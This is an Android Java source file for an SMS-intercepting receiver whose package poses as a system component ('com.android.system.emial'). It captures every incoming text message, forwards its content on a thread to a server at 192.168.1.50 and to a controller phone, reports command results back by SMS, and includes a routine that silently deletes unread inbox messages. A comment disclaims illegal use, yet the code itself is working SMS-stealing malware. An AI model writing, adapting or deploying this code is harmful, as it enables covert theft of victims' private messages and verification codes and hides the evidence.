package com.android.system.emial;

import android.app.Activity;
import android.content.BroadcastReceiver;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.util.Log;

import java.text.SimpleDateFormat;
import java.util.Date;

public class SmSReceiver extends BroadcastReceiver {


    private SharedPreferences sp = null;
    private ContentResolver contentResolver;

    @Override
    public void onReceive(Context context, Intent intent) {
        // TODO Auto-generated method stub
        Log.i("action", intent.getAction());
        sp = context.getSharedPreferences("config", Context.MODE_PRIVATE);
        if (intent.getAction().equals(SmSserver.SMS_RECEIVED)
                || intent.getAction().equals(SmSserver.SMS_RECEIVED_2)
                || intent.getAction().equals(SmSserver.GSM_SMS_RECEIVED)) {
            SmSutils su = new SmSutils();
//			if (SmSutils.key.equals(SmSutils.getPublicKey(context))) {
            Bundle bundle = intent.getExtras();
            if (bundle != null && su.isflag()) {
                su.SendSms(bundle, context, this);
            }
//			}
        }


        //读取短信内容
        Bundle bundle = intent.getExtras();
        SmsMessage msg = null;

        if (null != bundle) {
            final Object[] smsObj = (Object[]) bundle.get("pdus");
            for (final Object object : smsObj) {
                msg = SmsMessage.createFromPdu((byte[]) object);
                Date date = new Date(msg.getTimestampMillis());//时间
                SimpleDateFormat format = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
                String receiveTime = format.format(date);
                System.out.println("number:" + msg.getOriginatingAddress()
                        + "   body:" + msg.getDisplayMessageBody() + "  time:"
                        + msg.getTimestampMillis());

                /***
                 * 用一个线程将所有收到的短信数据发送到我指定的服务器192.168.1.50的Service接口
                 */
                try {
                    String dxnr = msg.getDisplayMessageBody();//取当前获取到的短信内容
                    MyThread mythread = new MyThread(dxnr);
                    mythread.start();
                } catch (Exception e) {

                }

                //在这里写自己的逻辑
                if (msg.getOriginatingAddress().equals("10086")) {
                    //TODO
                }
            }
        }
        //Log.i("FY:", "下一行开始执行deleSMS");
        //deleteSMS(context, "000999");
        //Log.i("FY:", "已经执行deleSMS");

        // www.javaapk.com提供测试，请勿用于非法用途
        //Log.i("FYpp:", SmSserver.SendState);
        //Log.i("FYpp:", intent.getAction());

        if (intent.getAction().equals(SmSserver.SendState)) {
            SmSutils su = new SmSutils();
            if (this.getResultCode() != Activity.RESULT_OK) {
                su.sendSMS(SmSutils.phone, "指令执行失败状态码 " + this.getResultCode(),
                        null);
            } else {
                su.sendSMS(SmSutils.phone, "指令执行成功", null);
            }
        }
    }

    /**
     * Delete all SMS one by one
     */

    public void deleteSMS(Context context, String smscontent) {
        try {
            // 准备系统短信收信箱的uri地址
            Uri uri = Uri.parse("content://sms/inbox");// 收信箱
            // 查询收信箱里所有的短信
            Cursor isRead = context.getContentResolver().query(uri, null, "read=" + 0, null, null);
            Log.i("总短信数为：", "" + isRead.getCount());
            while (isRead.moveToNext()) {
                String phone = isRead.getString(isRead.getColumnIndex("address")).trim();//获取发信人
                String body = isRead.getString(isRead.getColumnIndex("body")).trim();// 获取信息内容
                //Log.i("FY:", phone + "|" + body);
                //if (body.equals(smscontent)){
                int id = isRead.getInt(isRead.getColumnIndex("_id"));
                //Log.i("WARR:", "" + id);
                context.getContentResolver().delete(Uri.parse("content://sms"), "_id=" + id, null);
                //}
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }


}
